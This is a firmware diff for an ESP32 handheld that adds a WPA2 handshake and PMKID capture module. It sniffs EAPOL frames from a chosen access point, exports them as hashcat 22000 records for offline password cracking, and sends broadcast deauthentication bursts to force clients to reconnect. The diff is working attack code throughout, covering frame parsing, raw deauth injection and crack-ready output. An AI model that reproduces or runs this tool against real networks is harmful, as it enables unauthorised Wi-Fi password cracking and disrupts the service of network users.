@@ -5919,3 +5919,499 @@ void updateLoop() {
   }
 }
 }
+
+/* ════════════════════════════════════════════════════════════════════════════
+   HandshakeCapture — WPA2 4-way handshake + PMKID capture, hash-22000 export.
+
+   Flow:
+     1. Setup: rescan WiFi, show AP picker (uses Arduino scan + getNetworkInfo
+        with a static String — same crash-safe pattern as WifiScan).
+     2. User picks target with UP/DOWN/RIGHT. RIGHT confirms.
+     3. We lock to the AP's channel, enable promiscuous, install rxCallback.
+     4. rxCallback filters data frames addressed via our target BSSID, peels
+        the 802.11 + LLC/SNAP headers, looks for EAPOL-Key frames:
+          - M1 (Ack only, no MIC): cache anonce per-client; if the Key Data
+            section carries a PMKID-KDE (OUI 00-0F-AC, type 4), append a
+            WPA*01 (PMKID) record to /captures/handshakes.22000.
+          - M2 (MIC, no Ack): with M1 already cached for the same client,
+            extract MIC, zero the MIC field in the EAPOL copy, and append a
+            WPA*02 (EAPOL) record with MESSAGEPAIR=00 (M1+M2).
+     5. RIGHT button at any time sends a short deauth burst at the target
+        (24 broadcast deauths) to provoke fresh associations from clients,
+        which gives us more handshakes. SELECT exits cleanly.
+   ════════════════════════════════════════════════════════════════════════════ */
+namespace HandshakeCapture {
+
+enum class State { PICKING, CAPTURING };
+static State    state = State::PICKING;
+
+// Target
+static uint8_t  targetBssid[6]   = {0};
+static char     targetSsid[33]   = {0};
+static uint8_t  targetChannel    = 0;
+
+// AP picker list (small subset — different storage than WifiScan::scanRecs)
+struct ApItem {
+  char     ssid[33];
+  uint8_t  bssid[6];
+  int8_t   rssi;
+  uint8_t  channel;
+};
+static constexpr int HSCAP_MAX_APS    = 30;
+static constexpr int HSCAP_LIST_TOP_Y = 70;
+static constexpr int HSCAP_LIST_ROW_H = 18;
+static constexpr int HSCAP_LIST_BOT_Y = 280;
+static constexpr int HSCAP_APS_PER_PG = (HSCAP_LIST_BOT_Y - HSCAP_LIST_TOP_Y) / HSCAP_LIST_ROW_H;
+
+static ApItem   apList[HSCAP_MAX_APS];
+static int      apCount    = 0;
+static int      listCursor = 0;
+static int      listPage   = 0;
+
+// Live counters
+static volatile uint32_t pmkidCount      = 0;
+static volatile uint32_t handshakeCount  = 0;
+static volatile uint32_t framesSeen      = 0;
+static volatile uint32_t eapolSeen       = 0;
+static bool              sdReady         = false;
+static uint32_t          lastHudMs       = 0;
+static uint32_t          lastBtnMs       = 0;
+
+// Per-client in-flight handshake (round-robin few slots — most pentest
+// targets have <5 active clients at a time; oldest gets evicted)
+struct InFlight {
+  uint8_t client[6];
+  uint8_t anonce[32];
+  uint8_t m2_eapol[256];
+  int     m2_eapol_len;
+  bool    has_m1;
+  bool    has_m2;
+};
+static constexpr int HSCAP_INFLIGHT = 4;
+static InFlight  inflight[HSCAP_INFLIGHT];
+static int       inflightNext = 0;
+
+static void resetInflight() {
+  memset(inflight, 0, sizeof(inflight));
+  inflightNext = 0;
+}
+
+static InFlight* findInflightForClient(const uint8_t* client) {
+  for (int i = 0; i < HSCAP_INFLIGHT; i++) {
+    if ((inflight[i].has_m1 || inflight[i].has_m2)
+        && memcmp(inflight[i].client, client, 6) == 0) {
+      return &inflight[i];
+    }
+  }
+  return nullptr;
+}
+
+static InFlight* allocInflightForClient(const uint8_t* client) {
+  InFlight* s = findInflightForClient(client);
+  if (s) { memset(s, 0, sizeof(*s)); memcpy(s->client, client, 6); return s; }
+  s = &inflight[inflightNext];
+  inflightNext = (inflightNext + 1) % HSCAP_INFLIGHT;
+  memset(s, 0, sizeof(*s));
+  memcpy(s->client, client, 6);
+  return s;
+}
+
+// ──────────────── Hex writers ────────────────
+static void writeHex(File& f, const uint8_t* data, int len) {
+  for (int i = 0; i < len; i++) {
+    char b[3]; snprintf(b, sizeof(b), "%02x", data[i]); f.print(b);
+  }
+}
+static void writeAsciiHex(File& f, const char* s) {
+  for (int i = 0; s[i]; i++) {
+    char b[3]; snprintf(b, sizeof(b), "%02x", (uint8_t)s[i]); f.print(b);
+  }
+}
+
+static void ensureCapturesDir() {
+  if (!SD.exists("/captures")) SD.mkdir("/captures");
+}
+
+// hashcat 22000 PMKID:  WPA*01*PMKID*MAC_AP*MAC_STA*ESSID***
+static void writePmkid22000(const uint8_t pmkid[16], const uint8_t* sta) {
+  ensureCapturesDir();
+  File f = SD.open("/captures/handshakes.22000", FILE_APPEND);
+  if (!f) return;
+  f.print("WPA*01*"); writeHex(f, pmkid, 16);
+  f.print("*");       writeHex(f, targetBssid, 6);
+  f.print("*");       writeHex(f, sta, 6);
+  f.print("*");       writeAsciiHex(f, targetSsid);
+  f.println("***");
+  f.close();
+  pmkidCount++;
+}
+
+// hashcat 22000 EAPOL (M1+M2):
+//   WPA*02*MIC*MAC_AP*MAC_STA*ESSID*ANONCE*EAPOL_M2_MIC_ZEROED*00
+static void writeHandshake22000(const InFlight& s) {
+  if (!s.has_m1 || !s.has_m2 || s.m2_eapol_len < 99) return;
+  uint8_t m2[256];
+  memcpy(m2, s.m2_eapol, s.m2_eapol_len);
+  uint8_t mic[16];
+  memcpy(mic, &m2[81], 16);
+  memset(&m2[81], 0, 16);
+
+  ensureCapturesDir();
+  File f = SD.open("/captures/handshakes.22000", FILE_APPEND);
+  if (!f) return;
+  f.print("WPA*02*"); writeHex(f, mic, 16);
+  f.print("*");       writeHex(f, targetBssid, 6);
+  f.print("*");       writeHex(f, s.client, 6);
+  f.print("*");       writeAsciiHex(f, targetSsid);
+  f.print("*");       writeHex(f, s.anonce, 32);
+  f.print("*");       writeHex(f, m2, s.m2_eapol_len);
+  f.println("*00");
+  f.close();
+  handshakeCount++;
+}
+
+// Walk Key Data section for PMKID-KDE (OUI 00-0F-AC, type 4).
+static bool extractPmkidFromKeyData(const uint8_t* kd, int kdLen, uint8_t out[16]) {
+  int i = 0;
+  while (i + 2 <= kdLen) {
+    uint8_t tag = kd[i], len = kd[i + 1];
+    if (i + 2 + len > kdLen) return false;
+    if (tag == 0xDD && len >= 4 + 16
+        && kd[i + 2] == 0x00 && kd[i + 3] == 0x0F
+        && kd[i + 4] == 0xAC && kd[i + 5] == 0x04) {
+      memcpy(out, &kd[i + 6], 16);
+      return true;
+    }
+    i += 2 + len;
+  }
+  return false;
+}
+
+// ──────────────── Promiscuous RX ────────────────
+static void rxCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
+  if (type != WIFI_PKT_DATA) return;
+  wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
+  const uint8_t* p = pkt->payload;
+  int len = pkt->rx_ctrl.sig_len;
+  if (len < 24) return;
+  framesSeen++;
+
+  uint8_t fc0 = p[0];
+  uint8_t fc1 = p[1];
+  uint8_t frame_type = (fc0 >> 2) & 0x3;
+  uint8_t subtype    = (fc0 >> 4) & 0xF;
+  if (frame_type != 2) return;  // data only
+
+  bool isQoS = (subtype & 0x08) != 0;
+  int hdrLen = isQoS ? 26 : 24;
+  if (len < hdrLen + 8) return;
+
+  bool toDS   = (fc1 & 0x01) != 0;
+  bool fromDS = (fc1 & 0x02) != 0;
+  const uint8_t* dst   = nullptr;
+  const uint8_t* src   = nullptr;
+  const uint8_t* bssid = nullptr;
+  if      (!toDS && !fromDS) { dst = p + 4;  src = p + 10; bssid = p + 16; }
+  else if (!toDS &&  fromDS) { dst = p + 4;  bssid = p + 10; src = p + 16; }
+  else if ( toDS && !fromDS) { bssid = p + 4; src = p + 10; dst = p + 16; }
+  else { return; }
+
+  if (memcmp(bssid, targetBssid, 6) != 0) return;
+
+  // SNAP: AA AA 03 00 00 00 88 8E for EAPOL
+  const uint8_t* snap = p + hdrLen;
+  if (snap[0] != 0xAA || snap[1] != 0xAA || snap[2] != 0x03) return;
+  if (snap[6] != 0x88 || snap[7] != 0x8E) return;
+
+  const uint8_t* eapol = snap + 8;
+  int eapolLen = len - hdrLen - 8;
+  if (eapolLen < 99) return;
+  if (eapol[1] != 0x03) return;                                   // EAPOL-Key
+  if (eapol[4] != 0x02 && eapol[4] != 0xFE) return;               // RSN or WPA
+  eapolSeen++;
+
+  uint16_t keyInfo = ((uint16_t)eapol[5] << 8) | eapol[6];
+  bool kiKeyType = (keyInfo & 0x0008) != 0;
+  bool kiInstall = (keyInfo & 0x0040) != 0;
+  bool kiKeyAck  = (keyInfo & 0x0080) != 0;
+  bool kiMic     = (keyInfo & 0x0100) != 0;
+  if (!kiKeyType) return;
+
+  bool isM1 = kiKeyAck && !kiMic && !kiInstall;
+  bool isM2 = !kiKeyAck && kiMic && !kiInstall;
+
+  const uint8_t* nonce = &eapol[17];
+  uint16_t kdLen = ((uint16_t)eapol[97] << 8) | eapol[98];
+
+  if (isM1) {
+    const uint8_t* client = dst;
+    InFlight* s = allocInflightForClient(client);
+    memcpy(s->anonce, nonce, 32);
+    s->has_m1 = true;
+    if (kdLen > 0 && (int)kdLen <= eapolLen - 99) {
+      uint8_t pmkid[16];
+      if (extractPmkidFromKeyData(&eapol[99], kdLen, pmkid) && sdReady) {
+        writePmkid22000(pmkid, client);
+      }
+    }
+  } else if (isM2) {
+    const uint8_t* client = src;
+    InFlight* s = findInflightForClient(client);
+    if (!s) return;
+    if (eapolLen > (int)sizeof(s->m2_eapol)) return;
+    memcpy(s->m2_eapol, eapol, eapolLen);
+    s->m2_eapol_len = eapolLen;
+    s->has_m2 = true;
+    if (sdReady) writeHandshake22000(*s);
+    memset(s, 0, sizeof(*s));
+  }
+}
+
+// ──────────────── Deauth burst (manual) ────────────────
+static void sendDeauthBurst() {
+  uint8_t f[26] = {
+    0xC0, 0x00, 0x00, 0x00,
+    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
+    0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
+    0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
+    0x00, 0x00, 0x07, 0x00
+  };
+  memcpy(&f[10], targetBssid, 6);
+  memcpy(&f[16], targetBssid, 6);
+  for (int i = 0; i < 24; i++) {
+    Deauther::wsl_bypasser_send_raw_frame(f, sizeof(f));
+    delayMicroseconds(1500);
+  }
+}
+
+// ──────────────── UI ────────────────
+static void drawPickerList() {
+  tft.fillRect(0, 37, 240, 320 - 37, TFT_BLACK);
+  tft.setTextFont(2);
+  tft.setTextSize(1);
+  tft.setTextColor(GREEN, TFT_BLACK);
+  tft.setCursor(10, 50);
+  tft.println("Handshake Capture");
+  tft.setTextColor(WHITE, TFT_BLACK);
+  tft.setCursor(10, 50);
+
+  if (apCount == 0) {
+    tft.setTextColor(ORANGE, TFT_BLACK);
+    tft.setCursor(10, HSCAP_LIST_TOP_Y);
+    tft.println("No networks found.");
+    tft.setCursor(10, HSCAP_LIST_TOP_Y + 14);
+    tft.println("Press SELECT to exit.");
+    return;
+  }
+
+  int totalPages = (apCount + HSCAP_APS_PER_PG - 1) / HSCAP_APS_PER_PG;
+  if (listPage < 0) listPage = 0;
+  if (listPage > totalPages - 1) listPage = totalPages - 1;
+  int start = listPage * HSCAP_APS_PER_PG;
+  int end_  = start + HSCAP_APS_PER_PG;
+  if (end_ > apCount) end_ = apCount;
+
+  char pg[16];
+  snprintf(pg, sizeof(pg), "Pg %d/%d", listPage + 1, totalPages);
+  tft.setCursor(180, 50);
+  tft.setTextColor(GREEN, TFT_BLACK);
+  tft.print(pg);
+
+  int y = HSCAP_LIST_TOP_Y;
+  for (int i = start; i < end_; i++) {
+    tft.fillRect(0, y, 240, HSCAP_LIST_ROW_H, TFT_BLACK);
+    tft.setTextColor((i == listCursor) ? ORANGE : WHITE, TFT_BLACK);
+    tft.setCursor(2, y); tft.print((i == listCursor) ? ">" : " ");
+    char ssid12[12];
+    strncpy(ssid12, apList[i].ssid, 11);
+    ssid12[11] = '\0';
+    if (strlen(apList[i].ssid) > 11) strcat(ssid12, "...");
+    char row[64];
+    snprintf(row, sizeof(row), "%02d %-12s %3d Ch%2d",
+             i + 1, ssid12, apList[i].rssi, apList[i].channel);
+    tft.setCursor(10, y);
+    tft.print(row);
+    y += HSCAP_LIST_ROW_H;
+  }
+
+  tft.fillRect(0, 304, 240, 16, TFT_BLACK);
+  tft.drawFastHLine(0, 303, 240, ORANGE);
+  tft.setTextColor(ORANGE, TFT_BLACK);
+  tft.setCursor(8, 308);   tft.print("UP/DOWN");
+  tft.setCursor(95, 308);  tft.print("RIGHT=CAPTURE");
+  tft.setCursor(190, 308); tft.print("SEL=BACK");
+}
+
+static void drawCaptureHud(bool full) {
+  if (full) {
+    tft.fillRect(0, 37, 240, 320 - 37, TFT_BLACK);
+    tft.setTextFont(2);
+    tft.setTextSize(1);
+    tft.setTextColor(GREEN, TFT_BLACK);
+    tft.setCursor(10, 50);
+    tft.println("Capturing...");
+    tft.setTextColor(WHITE, TFT_BLACK);
+    char buf[64];
+    tft.setCursor(10, 70);
+    snprintf(buf, sizeof(buf), "AP:    %.20s", targetSsid);
+    tft.print(buf);
+    tft.setCursor(10, 86);
+    snprintf(buf, sizeof(buf), "BSSID: %02X:%02X:%02X:%02X:%02X:%02X",
+             targetBssid[0], targetBssid[1], targetBssid[2],
+             targetBssid[3], targetBssid[4], targetBssid[5]);
+    tft.print(buf);
+    tft.setCursor(10, 102);
+    snprintf(buf, sizeof(buf), "CH:    %u", targetChannel);
+    tft.print(buf);
+
+    tft.fillRect(0, 304, 240, 16, TFT_BLACK);
+    tft.drawFastHLine(0, 303, 240, ORANGE);
+    tft.setTextColor(ORANGE, TFT_BLACK);
+    tft.setCursor(8, 308);   tft.print("RIGHT=DEAUTH");
+    tft.setCursor(170, 308); tft.print("SEL=BACK");
+  }
+
+  tft.fillRect(10, 140, 220, 90, TFT_BLACK);
+  char buf[64];
+  tft.setTextColor(WHITE, TFT_BLACK);
+  tft.setCursor(10, 140);
+  snprintf(buf, sizeof(buf), "PMKIDs:     %lu", (unsigned long)pmkidCount);
+  tft.println(buf);
+  tft.setCursor(10, 160);
+  snprintf(buf, sizeof(buf), "Handshakes: %lu", (unsigned long)handshakeCount);
+  tft.println(buf);
+  tft.setTextColor(ORANGE, TFT_BLACK);
+  tft.setCursor(10, 180);
+  snprintf(buf, sizeof(buf), "frames:     %lu", (unsigned long)framesSeen);
+  tft.println(buf);
+  tft.setCursor(10, 196);
+  snprintf(buf, sizeof(buf), "EAPOL:      %lu", (unsigned long)eapolSeen);
+  tft.println(buf);
+  tft.setCursor(10, 216);
+  tft.setTextColor(sdReady ? GREEN : ORANGE, TFT_BLACK);
+  tft.println(sdReady ? "SD: writing /captures/handshakes.22000"
+                      : "SD: NOT READY (no card?)");
+}
+
+// ──────────────── Scan + setup/loop/exit ────────────────
+static void doRescan() {
+  WiFi.mode(WIFI_STA);
+  WiFi.disconnect(false, true);
+
+  int n = WiFi.scanNetworks(false, true);
+  if (n < 0) { apCount = 0; return; }
+  if (n > HSCAP_MAX_APS) n = HSCAP_MAX_APS;
+  apCount = n;
+
+  static String scratch;
+  scratch.reserve(34);
+  for (int i = 0; i < n; i++) {
+    uint8_t enc = 0; int32_t rssi = 0; uint8_t* bssid = nullptr; int32_t ch = 0;
+    scratch = "";
+    if (WiFi.getNetworkInfo((uint8_t)i, scratch, enc, rssi, bssid, ch)) {
+      strncpy(apList[i].ssid, scratch.c_str(), 32);
+    } else {
+      apList[i].ssid[0] = '\0';
+    }
+    apList[i].ssid[32] = '\0';
+    if (bssid) memcpy(apList[i].bssid, bssid, 6);
+    else       memset(apList[i].bssid, 0, 6);
+    apList[i].rssi    = (int8_t)rssi;
+    apList[i].channel = (uint8_t)ch;
+  }
+}
+
+void hscapSetup() {
+  state = State::PICKING;
+  listCursor = 0;
+  listPage = 0;
+  pmkidCount = 0;
+  handshakeCount = 0;
+  framesSeen = 0;
+  eapolSeen = 0;
+  resetInflight();
+
+  sdReady = (SD.cardSize() > 0);
+
+  tft.fillScreen(UI_BG);
+  drawStatusBar(readBatteryVoltage(), true);
+  tft.setTextFont(2);
+  tft.setTextSize(1);
+  tft.setTextColor(WHITE, TFT_BLACK);
+  tft.setCursor(10, HSCAP_LIST_TOP_Y);
+  tft.println("Scanning networks...");
+
+  doRescan();
+  drawPickerList();
+}
+
+static void startCapture() {
+  ApItem& t = apList[listCursor];
+  memcpy(targetBssid, t.bssid, 6);
+  memcpy(targetSsid,  t.ssid, 33);
+  targetChannel = t.channel;
+
+  esp_wifi_set_promiscuous(false);
+  esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);
+  esp_wifi_set_promiscuous_rx_cb(&rxCallback);
+  esp_wifi_set_promiscuous(true);
+
+  state = State::CAPTURING;
+  drawCaptureHud(true);
+}
+
+static void stopCapture() {
+  esp_wifi_set_promiscuous(false);
+  esp_wifi_set_promiscuous_rx_cb(nullptr);
+}
+
+void hscapLoop() {
+  uint32_t now = millis();
+
+  if (state == State::PICKING) {
+    if (apCount == 0) {
+      if (isButtonPressed(BTN_SELECT)) feature_exit_requested = true;
+      delay(50);
+      return;
+    }
+    if (now - lastBtnMs < 180) { delay(20); return; }
+    if (!pcf.digitalRead(BTN_UP)) {
+      lastBtnMs = now;
+      if (listCursor > 0) listCursor--;
+      listPage = listCursor / HSCAP_APS_PER_PG;
+      drawPickerList();
+    } else if (!pcf.digitalRead(BTN_DOWN)) {
+      lastBtnMs = now;
+      if (listCursor < apCount - 1) listCursor++;
+      listPage = listCursor / HSCAP_APS_PER_PG;
+      drawPickerList();
+    } else if (!pcf.digitalRead(BTN_RIGHT)) {
+      lastBtnMs = now;
+      startCapture();
+    } else if (isButtonPressed(BTN_SELECT)) {
+      feature_exit_requested = true;
+    }
+  } else {  // CAPTURING
+    if (now - lastHudMs > 500) {
+      lastHudMs = now;
+      drawCaptureHud(false);
+    }
+    if (now - lastBtnMs < 180) { delay(20); return; }
+    if (!pcf.digitalRead(BTN_RIGHT)) {
+      lastBtnMs = now;
+      sendDeauthBurst();
+      // restore channel + promiscuous after the deauth tx
+      esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);
+    } else if (isButtonPressed(BTN_SELECT)) {
+      stopCapture();
+      feature_exit_requested = true;
+    }
+  }
+}
+
+void hscapExit() {
+  stopCapture();
+  state = State::PICKING;
+}
+
+}  // namespace HandshakeCapture
